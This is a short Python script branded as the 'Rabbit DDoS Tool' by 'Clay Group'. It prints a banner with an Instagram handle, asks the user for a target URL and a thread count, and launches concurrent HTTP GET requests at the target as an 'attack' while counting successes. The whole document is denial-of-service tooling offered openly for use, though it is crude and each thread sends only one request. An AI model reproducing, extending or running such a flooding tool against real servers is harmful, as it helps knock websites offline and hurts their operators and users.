import requests
import threading
import time
import sys

# Colors for the banner
GREEN = '\033[0;32m'
RED = '\033[0;31m'
CYAN = '\033[0;36m'
YELLOW = '\033[1;33m'
RESET = '\033[0m'

# Banner with Rabbit and your info
def print_banner():
    print(f"{CYAN}==========================================")
    print(f"{YELLOW}        RRRRR    AAAAA  BBBBB   III  TTTTT")
    print(f"        R    R  A     A B    B   I     T")
    print(f"        RRRRR   AAAAAAA BBBBB    I     T")
    print(f"        R   R   A     A B    B   I     T")
    print(f"        R    R  A     A BBBBB   III    T")
    print(f"{GREEN}     Rabbit DDoS Tool by Clay Group")
    print(f"{CYAN}   Follow me on Instagram: @h4cker.in")
    print(f"{RESET}==========================================")

# Counter for requests
request_counter = 0

# Function to send real HTTP requests
def send_request(url):
    global request_counter
    try:
        response = requests.get(url)
        if response.status_code == 200:
            request_counter += 1
            print(f"{GREEN}[+] Request Sent: {request_counter} {RESET}", end='\r')
        else:
            print(f"{RED}[!] Failed to send request, Status Code: {response.status_code} {RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{RED}[!] Error: {e} {RESET}")

# Function to handle multiple threads and simulate multiple requests
def start_attack(url, threads):
    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=send_request, args=(url,))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()

def main():
    # Show the banner
    print_banner()

    # User inputs for URL and threads
    url = input(f"{YELLOW}Enter the server URL (e.g., http://127.0.0.1): {RESET}")
    try:
        threads = int(input(f"{YELLOW}Enter the number of threads to simulate: {RESET}"))
    except ValueError:
        print(f"{RED}[!] Invalid input. Defaulting to 100 threads.")
        threads = 100

    # Starting the stress test
    print(f"{CYAN}[+] Starting DDoS test on {url} with {threads} threads...{RESET}")
    start_attack(url, threads)

if __name__ == "__main__":
    main()
